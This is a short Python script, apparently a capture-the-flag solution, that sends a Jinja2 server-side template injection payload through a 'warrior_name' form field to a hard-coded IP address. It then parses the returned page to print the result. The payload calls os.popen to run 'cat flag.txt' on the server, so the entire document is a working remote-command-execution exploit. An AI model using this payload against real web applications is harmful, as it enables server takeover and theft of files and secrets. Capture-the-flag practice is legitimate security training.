import requests
from bs4 import BeautifulSoup

server_url = "http://94.237.59.147:51418"

SSTI = '{{url_for.__globals__.os.popen("cat flag.txt").read()}}'

with requests.Session() as session:
    data = {'warrior_name': SSTI}
        
    session.post(f"{server_url}/begin", data=data)  

    response = session.post(f"{server_url}/battle-report")
    soup = BeautifulSoup(response.text, 'html.parser')
                         
    warrior_name = soup.find('p', class_='nes-text is-primary warrior-name')

    print(warrior_name)